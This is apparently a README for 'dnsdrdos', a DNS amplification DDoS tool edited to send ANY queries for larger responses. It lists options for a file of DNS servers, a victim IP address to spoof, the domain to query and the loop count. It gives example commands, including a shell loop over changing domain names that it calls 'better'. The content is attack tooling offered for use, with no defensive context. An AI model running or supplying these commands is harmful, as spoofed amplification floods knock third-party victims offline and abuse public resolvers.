# DNS amplification DDOS attack
This is an edited version of the original script of noptrix of nullsecurity.net.
Now the script will send DNS ANY query instead of DNS A query.

DNS ANY query request more data and because of that increase the amplification of the attack

usage:

  dnsdrdos -f <file> [options] | [misc]
    
target:

  -f <file>       - list of dns servers (only one ip-address per line!)
  -s <addr>       - ip-address to spoof (default: 127.0.0.1)
  -d <domain>     - which domain should be requested?
                    (default: "google.com.")
  -l <num>        - how many loops through list? (default: 10000)

misc:

  -V              - show version
  -H              - show help and usage

example:

  ./dnsdrdos -f nameserver.lst -s 192.168.2.211 -d google.com. -l 10000

  or better:

  $ for i in `seq 1 1000`; do ./dnsdrdos -f nameserver.lst -s 192.168.2.211 -d $i -l 10000; done

  This is better, because we ask dynamically for any domain names.
  Even if the domainname is not given, 'we' still would recieve DNS answers.
